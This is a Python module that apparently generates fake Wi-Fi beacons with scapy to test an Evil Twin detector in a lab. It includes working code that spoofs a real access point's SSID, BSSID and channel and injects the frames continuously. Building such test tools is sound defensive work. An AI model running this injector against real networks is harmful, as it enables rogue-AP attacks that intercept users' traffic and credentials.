#!/usr/bin/env python3
"""
=======================================================
  modules/simulator.py - Evil Twin Lab Beacon Generator
=======================================================

Used only for controlled wireless-security testing.

Simulation modes:
- Standard rogue AP:
  Same SSID with a different BSSID and simplified beacon structure.

- BSSID-spoofed AP:
  Same SSID, BSSID, and channel as the selected legitimate AP,
  while still using a simplified synthetic beacon structure.

The BSSID-spoofed mode is NOT a full high-fidelity clone of every
Information Element, security field, timing characteristic, or
implementation detail of the legitimate access point.
=======================================================
"""

import os
import random
import time

from scapy.all import sendp
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap


def build_attack_frame(
    ssid,
    bssid,
    channel,
    seq_num,
    bssid_clone=False
):
    """
    Build a synthetic 802.11 beacon frame for authorized lab testing.

    Parameters
    ----------
    ssid : str
        SSID to advertise.

    bssid : str
        BSSID used as transmitter/source address.

    channel : int
        Wi-Fi channel advertised by the beacon.

    seq_num : int
        802.11 sequence number.

    bssid_clone : bool
        When True, the caller supplies the legitimate AP's BSSID.
        This reproduces BSSID identity but does not reproduce the
        legitimate AP's complete beacon implementation.
    """

    radiotap = RadioTap()

    # Beacon management frames are broadcast.
    dot11 = Dot11(
        type=0,
        subtype=8,
        addr1="ff:ff:ff:ff:ff:ff",
        addr2=bssid,
        addr3=bssid,
        SC=seq_num << 4
    )

    # Synthetic timestamp used by the lab injector.
    # This is intentionally not treated as a genuine hardware-clock clone.
    synthetic_ts = (
        int(time.time() * 1_000_000)
        + random.randint(100, 5000)
    )

    beacon = Dot11Beacon(
        timestamp=synthetic_ts,
        beacon_interval=100,
        cap=0x0411
    )

    ssid_ie = Dot11Elt(
        ID=0,
        info=ssid.encode()
    )

    channel_ie = Dot11Elt(
        ID=3,
        info=bytes([channel])
    )

    if bssid_clone:
        # Slightly richer synthetic beacon used for BSSID-spoofing tests.
        # It still does not reproduce the complete IE structure of the
        # legitimate AP.
        rates_ie = Dot11Elt(
            ID=1,
            info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24'
        )

        ext_rates_ie = Dot11Elt(
            ID=50,
            info=b'\x30\x48\x60\x6c'
        )

        frame = (
            radiotap
            / dot11
            / beacon
            / ssid_ie
            / rates_ie
            / channel_ie
            / ext_rates_ie
        )

    else:
        # Simplified rogue-AP beacon profile.
        rates_ie = Dot11Elt(
            ID=1,
            info=b'\x82\x84\x8b\x96'
        )

        frame = (
            radiotap
            / dot11
            / beacon
            / ssid_ie
            / rates_ie
            / channel_ie
        )

    return frame


def simulate_evil_twin(
    interface,
    network_info,
    duration=60,
    bssid_clone=True
):
    """
    Generate synthetic Evil Twin beacon traffic in an authorized lab.

    This function is intended for testing the detector against either:

    1. A rogue AP using the same SSID but a different BSSID.
    2. A BSSID-spoofed transmitter advertising the same SSID and BSSID.

    It does not implement a complete high-fidelity clone of the
    legitimate access point.
    """

    ssid = network_info["ssid"]
    channel = int(network_info["channel"])

    if bssid_clone:
        bssid = network_info["bssid"]

        print(
            "\n[Lab Simulator] Launching BSSID-spoofed Evil Twin test"
        )
        print(f"  Target SSID  : {ssid}")
        print(f"  Spoofed BSSID: {bssid}")
        print(
            "  Mode         : Same SSID/BSSID with simplified "
            "synthetic beacon structure"
        )

    else:
        parts = network_info["bssid"].split(":")
        parts[-1] = "ee"
        bssid = ":".join(parts)

        print(
            "\n[Lab Simulator] Launching rogue AP test"
        )
        print(f"  Target SSID  : {ssid}")
        print(f"  Rogue BSSID  : {bssid}")
        print(
            "  Mode         : Same SSID with different BSSID"
        )

    print(f"  Channel      : {channel}")
    print(f"  Duration     : {duration} seconds")
    print(
        "  Authorization: Use only on networks and hardware "
        "you own or are permitted to test.\n"
    )

    os.system(
        f"iwconfig {interface} channel {channel} 2>/dev/null"
    )

    time.sleep(0.5)

    seq = 100
    end_time = time.time() + duration
    count = 0

    try:
        while time.time() < end_time:
            packet = build_attack_frame(
                ssid,
                bssid,
                channel,
                seq,
                bssid_clone=bssid_clone
            )

            sendp(
                packet,
                iface=interface,
                verbose=False
            )

            count += 1
            seq = (seq + 1) % 4096

            remaining = max(
                0,
                int(end_time - time.time())
            )

            print(
                f"\r  [Injecting Lab Frames] "
                f"Sent: {count:4d} | "
                f"Remaining: {remaining:2d}s",
                end="",
                flush=True
            )

            # Approximately 10 beacon frames per second.
            time.sleep(0.1)

    except KeyboardInterrupt:
        pass

    print(
        f"\n[✓] Lab simulation completed. "
        f"Injected {count} frames.\n"
    )
